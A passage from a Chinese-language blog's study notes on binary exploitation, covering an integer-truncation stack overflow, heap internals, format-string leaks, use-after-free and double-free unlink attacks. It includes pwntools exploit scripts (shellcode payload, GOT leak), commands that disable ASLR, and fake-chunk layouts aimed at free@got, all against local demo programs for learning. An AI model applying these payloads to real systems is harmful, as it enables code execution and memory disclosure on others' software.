class="number">11</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> passwd_len = <span class="built_in">strlen</span>(passwd);</span><br><span class="line"><span class="keyword">if</span>(passwd_len &gt;= <span class="number">4</span> &amp;&amp; passwd_len &lt;= <span class="number">8</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;good!\n&quot;</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(passwd_buf, passwd);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bad!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">validate_passwd(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这个程序，strlen()返回类型是size_t，却被储存在无符号字符串类型中，任意超过无符号字符串最大上上线值【256】的数据都会导致截断异常。当密码长度是261的时候，截断后的值就变成5，成功绕过了if判断，导致栈溢出。获得shell</p><p>解：</p><p>首先关闭这个地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -fno-stack-protector -z execstack a.c</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230527012540397.png" alt="image-20230527012540397"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">ret_addr = <span class="number">0xffffcc68</span> <span class="comment"># ebp = 0xffffcc58</span></span><br><span class="line">shellcode = shellcraft.i386.sh()</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">24</span></span><br><span class="line">payload += p32(ret_addr)</span><br><span class="line">payload += <span class="string">&quot;\x90&quot;</span> * <span class="number">20</span></span><br><span class="line">payload += asm(shellcode)</span><br><span class="line">payload += <span class="string">&quot;C&quot;</span> * <span class="number">169</span> <span class="comment"># 24 + 4 + 20 + 44 + 169 = 261</span></span><br></pre></td></tr></table></figure><p>根本没明白….这个shellcode 是咋写出来的。我是直无语了</p><h1 id="堆溢出漏洞基本原理"><a href="#堆溢出漏洞基本原理" class="headerlink" title="堆溢出漏洞基本原理"></a>堆溢出漏洞基本原理</h1><p>​    堆（chunk)内存是一种允许程序在运行过程中动态分配和使用的内存区城。相比于栈内存和全局内存，堆内存<strong>没有</strong>固定的生命周期和围定的内存区域，程序可以动态地申请和释放不同大小的内在。被分配后，如果没有进行明确的释放操作，该堆内存区域都是一直有效的。</p><p>堆是程序虚拟内存中由低地址向高地址增长的线性区域。一般只有当用户向操作系统申请内存时，这片区域才会被内核分配出来，并且出于效率和页对齐的考虑，通常会分配相当大的连续内存。程序再次申请时便会从这片内存中分配，直到堆空间不能满足时才会再次增长。堆的位置一般在BSS段高地址处。</p><p>为了进行高效的堆内存分配、回收和管理，Glibc实现了Ptmalloc2的 堆管理器。主要介绍Ptmalloc2堆管理器缺陷的分析和利用。只介绍Glibc 2.25版本最基本的结构和概念，以及2.26版本的加入新特性，具体堆管理器的实现请读者根据Ptmalloc2源代码进行深入了解。</p><h2 id="堆概述"><a href="#堆概述" class="headerlink" title="堆概述"></a>堆概述</h2><p>堆一直以来都是pwn的一个分水岭，你在CTF走多远就取决于你堆玩的有多6</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">heap #查看堆块</span><br><span class="line">bin #查看bin区块</span><br><span class="line">p &amp;__free_hook #查看某个函数的真实地址</span><br><span class="line">p *__free_hook #查看某个函数的指向</span><br><span class="line">x/xxgx 0xxxx #查看某个地址的内存</span><br><span class="line">vmmap</span><br></pre></td></tr></table></figure><h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><p>其实堆你就可以看成一个结构体数组，然后数组里每个元素都会开辟一块内存来存储数据</p><p>那么这块用来存储数据的内存就是堆。</p><p>结构体数组在BSS段上，其内容就是堆的地址，也就是堆的指针。</p><p>总的来说，就是划分为了2部分，管理区块和数据存放区块，存放区块就是堆，管理区块可以对堆增删改查</p><h2 id="题型划分"><a href="#题型划分" class="headerlink" title="题型划分"></a>题型划分</h2><p>off by one</p><p>off by null</p><p>堆溢出</p><p>UAF</p><p>double free</p><h2 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h2><p>其实无论什么题型，最后都是为了在管理区块上有多个指针指向同一个堆，最后的效果都是如此的</p><h2 id="堆大小的计算方法"><a href="#堆大小的计算方法" class="headerlink" title="堆大小的计算方法"></a>堆大小的计算方法</h2><p>min：最小值为0x20 你申请的再小都好 他都会划分为0x20</p><p>堆块大小的计算方式:你申请一个0x20的你会得到0x30 0x28的也是会得到0x30 他会自动进1位</p><h2 id="bin的划分"><a href="#bin的划分" class="headerlink" title="bin的划分"></a>bin的划分</h2><p>bin管理区块是管理被free后的堆的，是可以被我们利用的</p><p>tcache bins: 0-0x420大小 被free后的堆会进入这 填满7个后就不会再往里面填 寻址方式靠fd指针</p><p>large bin: 寻址方式靠fd bk指针 双向链表</p><p>small bin :寻址方式靠fd bk指针 双向链表</p><p>fast bin: 0~0x90寻址方式靠fd 指针 单链表</p><p>unsorted bin:寻址方式靠fd bk指针 双向链表</p><h2 id="从bin取堆的优先度"><a href="#从bin取堆的优先度" class="headerlink" title="从bin取堆的优先度"></a>从bin取堆的优先度</h2><p>tcache机制在Ubuntu18及以上才有，如果tcache里面有则优先从tcache里面取，如果没有就去对应大小的bin里面取，还是没有才去unsorted bin里面切割。</p><h2 id="堆的字段讲解"><a href="#堆的字段讲解" class="headerlink" title="堆的字段讲解"></a>堆的字段讲解</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x602000</span><br><span class="line">0x602000: prev_size size</span><br><span class="line">0x602010: fd bk</span><br><span class="line">0x602020: fd_next bk_next</span><br><span class="line">0x602030: 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>在堆没被释放的时候堆的有效字段为size，size以下都是我们的content也就是我们可以写入的内容，大小根据程序来申请的size来决定</p><p>我们前面提到了一点堆的size的问题，为什么是取16的整数倍是因为哪怕最小的一个chunk他需要的字段都要包含</p><p>prev_size size</p><p>fd bk</p><p>fd_next bk_next是large bin 和small bin 才有的</p><h2 id="size字段讲解"><a href="#size字段讲解" class="headerlink" title="size字段讲解"></a>size字段讲解</h2><p>关于size字段他又存在一个insure标志位我们申请的正常的堆在gdb看见的size字段结尾都是1例如0x91</p><p>这个insure位是用来记录这个堆前面的堆是否被释放，这里简单提下off by null的利用假设我的堆本来是</p><p>0x111大小的然后前面的堆是没被释放的，但是因为这个漏洞的关系导致了我0x111大小被修改为0x100</p><p>那么此时程序就误认为我们前面的堆被释放了，我们再去释放这个0x100的堆，前面的堆就会因为合并规则</p><p>和这个堆一起被丢进bins里面，但是我们的管理区块是没有删除他们的地址的，所以当我们再去申请的时候</p><p>就会造成管理区块有多个地址指向同一个堆可以造成堆复用进而导致getshell。</p><h2 id="fd-bk-prev-size的讲解"><a href="#fd-bk-prev-size的讲解" class="headerlink" title="fd bk prev_size的讲解"></a>fd bk prev_size的讲解</h2><p>prev_size记录的是前一个堆块的大小 是只有当前一个堆块被free的时候才会出现的，这个的初衷是用来防止用户串改被释放后的堆块的大小的但是我们依然各种漏洞绕过。</p><p>fd，bk指针是当chunk进入到bin里面会被启用的字段，此时他们就是有效的指针，我们可以修改指针达到任意地址申请的效果</p><h1 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a>格式化字符串漏洞利用</h1><h2 id="格式化字符串漏洞基本原理"><a href="#格式化字符串漏洞基本原理" class="headerlink" title="格式化字符串漏洞基本原理"></a>格式化字符串漏洞基本原理</h2><p>C语言中常用的格式化输出函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *format)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fprintf</span><span class="params">(FILE *stream, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sprintf</span><span class="params">(<span class="type">char</span> *str, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">snprintf</span><span class="params">(<span class="type">char</span>)</span></span><br></pre></td></tr></table></figure><p>两种用法类似，在C语言种，printf的常规用法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%S\n&quot;</span>,<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;number:%d\n&quot;</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>其中，函数第一个参数带有%d、%s等占位符的字符串被称为格式化字符串，占位符用于指明输出的参数值如何格式化。</p><p>占位符的语法为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter][flag][field width][.precision][length]type</span><br></pre></td></tr></table></figure><p>parameter可以忽略或者为**n$**，n表示此占位符是传入的第几个参数。</p><p>flags可为0个或多个，主要包括：</p><ul><li>+—总是表示有符号数值的’+’或’-‘，默认忽略正数的符号，仅适用于数值类型。</li><li>空格—有符号数的输出如果没有正负号或者输出0个字符，则以1个空格作为前缀。</li><li>-—左对齐，默认是右对齐。</li><li>＃—对于’g’与’G’，不删除尾部0以表示精度对于’f’、’F’、’e’、’E’、’g’、’G’，总是输出小数点；对于’o’、’x’、’X’，在非0数值前分别输出前缀0、0x和0X，表示数制。</li><li>0—在宽度选项前，表示用0填充</li></ul><p>field width给出显示数值的最小宽度，用于输出时填充固定宽度。实际输出字符的个数不足域宽时，根据左对齐或右对齐进行填充，负号解释为左对齐标志。如果域宽设置为“*”，则由对应的函数参数的值为当前域宽。</p><p>格式化字符串函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong></p><p>常见的有格式化字符串函数有：</p><ul><li>输入：<ul><li>scanf</li></ul></li><li>输出<ul><li><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230528133013753.png" alt="image-20230528133013753"></li></ul></li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="程序崩溃"><a href="#程序崩溃" class="headerlink" title="程序崩溃"></a>程序崩溃</h3><p>只需要输入很多个%s就可</p><p>%s%s%s%s%s%s%s%s%s%s%s%s%s%s</p><p>这是因为栈上不可能每个值都对应了合法的地址，所以总是会有某个地址可以使得程序崩溃。</p><h3 id="内存泄露"><a href="#内存泄露" class="headerlink" title="内存泄露"></a>内存泄露</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);</span><br><span class="line">    <span class="built_in">printf</span>(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230528134648560.png" alt="image-20230528134648560"></p><p>发现当输入%08x.%08x.%08x的时候就不对咯</p><p>gdb调试，下断点在printf处，然后运行输入：%08x.%08x.%08x</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230528135837332.png" alt="image-20230528135837332"></p><p>可以看出，此时此时已经进入了 printf 函数中，栈中第一个变量为返回地址，第二个变量为格式化字符串的地址，第三个变量为 a 的值，第四个变量为 b 的值，第五个变量为 c 的值，第六个变量为我们输入的格式化字符串对应的地址。继续运行程序，断在了第二个printf处：</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230528135933469.png" alt="image-20230528135933469"></p><p>此时，由于格式化字符串为 %x%x%x，所以，程序 会将栈上的 0xffffcd94 及其之后的数值分别作为第一，第二，第三个参数按照 int 型进行解析，分别输出。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230528135957703.png" alt="image-20230528135957703"></p><p>果然输出了栈中的内容</p><p><strong>需要注意的是，我们上面给出的方法，都是依次获得栈中的每个参数，直接获取栈中被视为第</strong> <strong>n+1</strong> <strong>个参数的值：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**%n$x**</span><br></pre></td></tr></table></figure><p>为什么这里要说是对应第 n+1 个参数呢？这是因为格式化参数里面的 n 指的是该格式化字符串对应的第n 个输出参数，那相对于输出函数来说，就是第 n+1 个参数了。</p><p>继续调试：</p><p>输入%3$x</p><p>我们确实获得了 printf 的第 4 个参数</p><h3 id="获取栈变量对应字符串"><a href="#获取栈变量对应字符串" class="headerlink" title="获取栈变量对应字符串"></a>获取栈变量对应字符串</h3><p>调试输入%s</p><p><strong>tips</strong></p><ul><li><p>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。</p></li><li><p>利用 %s 来获取变量所对应地址的内容，只不过有零截断。</p></li><li><p>利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。</p></li></ul><h3 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h3><p>格式化字符串漏洞中，我们所读取的格式化字符串都是在栈上的（因为是某个函数的局部变量，本例中s 是 main 函数的局部变量）。那么也就是说，在调用输出函数的时候，其实，第一个数的值其实就是该格式化字符串的地址。</p><p>那么由于我们可以控制该格式化字符串，如果我们知道该格式化字符串在输出函数调用时是第几个参数，这里假设该格式化字符串相对函数调用为第 k 个参数。那我们就可以通过如下的方式来获取某个指定地址 addr 的内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addr%k$s</span><br></pre></td></tr></table></figure><p>下面就是如何确定该格式化字符串为第几个参数的问题了，我们可以通过如下方式确定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[tag]%p%p%p%p%p%p...</span><br></pre></td></tr></table></figure><p>输出函数的第 5 个参数，但是是格式化字符串的第 4 个参数。</p><p>通过传入got表地址，程序就会把got真实地址打印出来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./leakmemory&#x27;</span>)</span><br><span class="line">leakmemory = ELF(<span class="string">&#x27;./leakmemory&#x27;</span>)</span><br><span class="line">__isoc99_scanf_got = leakmemory.got[<span class="string">&#x27;__isoc99_scanf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(__isoc99_scanf_got)</span><br><span class="line">payload = p32(__isoc99_scanf_got) + <span class="string">&#x27;%4$s&#x27;</span></span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;%4$s\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(u32(sh.recv()[<span class="number">4</span>:<span class="number">8</span>])) <span class="comment"># remove the first bytes of __isoc99_scanf@got</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="UAF和Double-Free的利用原理"><a href="#UAF和Double-Free的利用原理" class="headerlink" title="UAF和Double Free的利用原理"></a>UAF和Double Free的利用原理</h1><p>c代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *p1;</span><br><span class="line">    p1 = (<span class="type">char</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>)*<span class="number">10</span>);<span class="comment">//申请内存空间</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p1,<span class="string">&quot;hello&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p1 addr:%x,%s\n&quot;</span>,p1,p1);</span><br><span class="line">    <span class="built_in">free</span>(p1);<span class="comment">//释放内存空间</span></span><br><span class="line">    <span class="type">char</span> *p2;</span><br><span class="line">    p2 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>)*<span class="number">10</span>);<span class="comment">//二次申请内存空间，与第一次大小相同，申请到了同一块内存</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p1,<span class="string">&quot;world&quot;</span>,<span class="number">10</span>);<span class="comment">//对内存进行修改</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p2 addr:%x,%s\n&quot;</span>,p2,p1);<span class="comment">//验证</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上代码所示</p><p>1.指针p1申请内存，打印其地址值</p><p>2.然后释放p1</p><p>3.指针p2申请同样大小的内存，打印p2的地址，p1指针指向的值</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230528140649816.png" alt="image-20230528140649816"></p><p>p1与p2地址相同，p1指针释放后，p2申请相同的大小的内存，操作系统会将之前给p1的地址分配给</p><p>p2，修改p2的值，p1也被修改了。</p><p><strong>根本原因</strong></p><p>应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放回内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，</p><p>dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。</p><p><strong>简单讲</strong>就是第一次申请的内存空间在释放过后没有进行内存回收，导致下次申请内存的时候再次使用该内存块，使得以前的内存指针可以访问修改过的内存。</p><h2 id="linxu堆漏洞之Double-free"><a href="#linxu堆漏洞之Double-free" class="headerlink" title="linxu堆漏洞之Double free"></a>linxu堆漏洞之Double free</h2><h3 id="Double-free-同一个指针指向的内存被free2次"><a href="#Double-free-同一个指针指向的内存被free2次" class="headerlink" title="Double free:同一个指针指向的内存被free2次"></a>Double free:同一个指针指向的内存被free2次</h3><h3 id="Glibc背景知识"><a href="#Glibc背景知识" class="headerlink" title="Glibc背景知识"></a>Glibc背景知识</h3><p>Linux下堆分配器主要由两个结构管理堆内存，一种是堆块头部形成的隐式链表，另一种是管理空闲堆块的显式链表（Glibc中的bins数据结构）。关于bins的介绍已经有很多，就不赘述了。接下来介绍一下Linux下Double free漏洞原理以及free函数的堆块合并过程。</p><p>Double free漏洞原理： free函数在释放堆块时，会通过隐式链表判断相邻前、后堆块是否为空闲堆块；如果堆块为空闲就会进行合并，然后利用Unlink机制将该空闲堆块从Unsorted bin中取下。如果用户精心构造的假堆块被Unlink，很容易导致一次固定地址写，然后转换为任意地址读写，从而控制程序的执行。</p><p>Linux free函数原理</p><p>由堆块头部形成的隐式链表可知，一个需释放堆块相邻的堆块有两个：前一个块（由当前块头指针加pre_size确定），后一个块（由当前块头指针加size确定）。从而，在合并堆块时会存在两种情况：向后合并、向前合并。当前一个块和当前块合并时，叫做向后合并。当后一个块和当前块合并时，叫做向前合并。</p><p>malloc.c int_free函数中相关代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="comment">/* check/set/clear inuse bits in known places */</span></span><br><span class="line">(((mchunkptr)(((<span class="type">char</span> \*) (p)) + (s)))-&gt;size&amp; PREV_INUSE)</span><br><span class="line">_int_free(mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"><span class="comment">/* consolidate backward \*/</span> <span class="comment">// &quot;向后合并&quot;</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123; <span class="comment">//如果前一个块为空闲，则进行合并</span></span><br><span class="line">prevsize = p-&gt;prev_size; <span class="comment">//获得前一个块大小</span></span><br><span class="line">size += prevsize; <span class="comment">//合并后堆块大小</span></span><br><span class="line">p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize)); <span class="comment">//根据当前块指针和前一个块大小，确定前一个块位置，即合并后块位置</span></span><br><span class="line">unlink(av, p, bck, fwd); <span class="comment">//利用unlink从显式链表Unsorted</span></span><br><span class="line">bin取下前一个块</span><br><span class="line">&#125;</span><br><span class="line">nextchunk = chunk_at_offset(p, size); <span class="comment">//根据当前块指针和当前块大小， 确定后一个块位置，</span></span><br><span class="line">nextsize = chunksize(nextchunk); <span class="comment">//获得后一个块大小</span></span><br><span class="line">nextinuse = inuse_bit_at_offset(nextchunk, nextsize); <span class="comment">//根据下一个块的下一个块的PREV_INUSE位，判断下一个块是否空闲</span></span><br><span class="line"><span class="comment">/* consolidate forward \*/</span> <span class="comment">// &quot;向前合并&quot;</span></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) &#123; <span class="comment">//如果后一个块为空闲，则进行合并</span></span><br><span class="line">unlink(av, nextchunk, bck, fwd); <span class="comment">//使用unlink将后一个块从unsorted</span></span><br><span class="line">bin中取下</span><br><span class="line">size += nextsize; <span class="comment">//扩大当前块大小即可完成向前合并</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>//由于unlink的危险性，添加了一些检测机制，完整版unlink宏如下</p><p>/* Take a chunk off a bin list */</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="Double-free漏洞利用原理"><a href="#Double-free漏洞利用原理" class="headerlink" title="Double free漏洞利用原理"></a>Double free漏洞利用原理</h3><p>以64位应用为例：如果在free一个指针指向的块时，由于堆溢出，将后一个块的块头改成如下格式：</p><ul><li>fake_prevsize1 = 被释放块大小；</li><li>fake_size1 = 0x20 | 1 (fake_size1 = 0x20)</li><li>fake_fd = <a href="mailto:&#x66;&#114;&#x65;&#101;&#x40;&#x67;&#111;&#x74;&#x2e;&#112;&#x6c;&#x74;">&#x66;&#114;&#x65;&#101;&#x40;&#x67;&#111;&#x74;&#x2e;&#112;&#x6c;&#x74;</a> - 0x18 </li><li>fake_bk = shellcode address</li><li>fake_prevsize2 = 0x20</li><li>fake_size2 = 0x10</li></ul><p>如果chunk0被释放(fake_size1 = 0x21)，进行空闲块合并时，1）由于前一个块非空闲，不会向后合并。2）根据chunk2判断后一个块chunk1空闲，向前合并，导致unlink。如果chunk1被释放(fake_size1 = 0x20)，进行空闲块合并时，1）由于前一个块空闲，向后合并,导致unlink。2）根据chunk2判断后一个块chunk1空闲，向前合并，导致unlink。根据unlink宏知道， 前一个块 FD 指向 <a href="mailto:&#x66;&#x72;&#101;&#101;&#64;&#103;&#x6f;&#x74;&#46;&#x70;&#108;&#x74;">&#x66;&#x72;&#101;&#101;&#64;&#103;&#x6f;&#x74;&#46;&#x70;&#108;&#x74;</a> - 0x18, 后一个块 BK 指向 shellcode address。然后前一个块 FD 的bk指针即<a href="mailto:&#102;&#114;&#101;&#101;&#64;&#103;&#111;&#116;&#46;&#112;&#108;&#x74;">&#102;&#114;&#101;&#101;&#64;&#103;&#111;&#116;&#46;&#112;&#108;&#x74;</a>，值为shellcode address, 后一个块 BK 的 fd 指针即shellcode+ 0x10，值为 <a href="mailto:&#x66;&#114;&#x65;&#101;&#x40;&#x67;&#x6f;&#x74;&#46;&#x70;&#108;&#x74;">&#x66;&#114;&#x65;&#101;&#x40;&#x67;&#x6f;&#x74;&#46;&#x70;&#108;&#x74;</a>。从而实现了一次固定地址写。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230528162811484.png" alt="image-20230528145046242"></p><p>但是，由于当前glibc的加固检测机制，会检查显式链表中前一个块的fd与后一个块的bk是否都指向当前需要unlink的块。这样攻击者就无法替换chunk1(或chunk0)的fd与bk。相关代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(__builtin_expect(FD-&gt;bk!=P||BK-&gt;fd!=P,<span class="number">0</span>))</span><br><span class="line">malloc_printerr(check_action,<span class="string">&quot;corrupteddouble-linkedlist&quot;</span>,P,AV)</span><br></pre></td></tr></table></figure><p>针对这种情况，需要在内存中找到一个指向需要unlink块的指针，就可以绕过。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>二进制安全漏洞之缓冲区溢出（31）</title>
      <link href="/2023/05/25/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-31-%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
      <url>/2023/05/25/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-31-%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
      
